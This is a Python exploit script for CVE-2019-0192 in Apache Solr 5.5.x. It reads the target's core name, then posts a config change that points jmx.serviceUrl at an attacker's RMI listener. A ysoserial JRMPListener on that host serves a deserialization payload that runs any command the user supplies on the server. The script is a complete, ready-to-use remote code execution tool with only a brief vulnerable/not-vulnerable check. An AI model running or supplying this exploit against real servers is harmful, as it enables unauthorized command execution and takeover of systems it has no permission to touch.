# -*- coding:utf-8 -*-
# Author:g5z3r

import requests
import sys
import json
import urllib3
import argparse
import time


# solr:5.5.0 - 5.5.5
# ysoserial: jdk < 7u25
# https://gist.github.com/frohoff/24af7913611f8406eaf3#updated-jre-version-example

urllib3.disable_warnings()
def main():
    if sys.argv.__len__() <= 2:
        print("usage:python Solr_RCE_CVE-2019-0192 -u http://www.xxx.com -c \"ping xxx.dnslog.cn\"")
        exit(0)
    else:
        parse = argparse.ArgumentParser()
        # group = parse.add_mutually_exclusive_group()
        parse.add_argument('-u',"--url",help='input target url,Example: http://192.168.1.1:8080',required=True)
        parse.add_argument('-c','--command',help='exec command,Example: ping xxx.dnslog.cn',required=True)
        parse.add_argument('-j','--jar',help='special filepath of ysoserial.jar,Example: C:\\tools\\ysoserial.jar',required=True)
        parse.add_argument('-t','--target',help='input ysoserial\'s host,Example: 192.168.64.1',required=True)
        # group.add_argument('-f','--file',help='url list,Example: urls.txt')
        args = parse.parse_args()

        if args.url[-1:] == "/":
            host = args.url[:-1]
        else:
            host = args.url
        jar = args.jar
        command = args.command
        target = args.target
    headers = {
        "Accept":"*/*",
        "Accept-Language":"English",
        "User-Agent":"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
        "Content-Type":"application/json",
        "Connection":"close"
    }
    proxies = {
        "http":"http://127.0.0.1:9090",
        "https":"http://127.0.0.1:9090"
    }
    url = "/solr/admin/cores?indexInfo=false&wt=json"
    response = requests.get(url=host+url,headers=headers,proxies=proxies)
    core_name = next(iter(response.json()['status']))
    ysoserial_command = 'java -cp ' + jar + ' ysoserial.exploit.JRMPListener 1234 Jdk7u21 "' + command + '"'
    print("[+]ysoserial command: " + ysoserial_command)
    print("[+]waiting for 5 second")
    time.sleep(5)
    url = "/solr/" + core_name + "/config"
    data = {
        "set-property" : {
            "jmx.serviceUrl" : "service:jmx:rmi:///jndi/rmi://" + target + ":1234/obj"
        }
    }
    response = requests.post(url=host+url,headers=headers,data=json.dumps(data),proxies=proxies)
    if "undeclared checked exception; nested exception is" in response.text:
        print("[+]host " + host + " is vulnable.")
    else:
        print("[-]host " + host + " is not vulnable.")

if __name__ == '__main__':
    main()

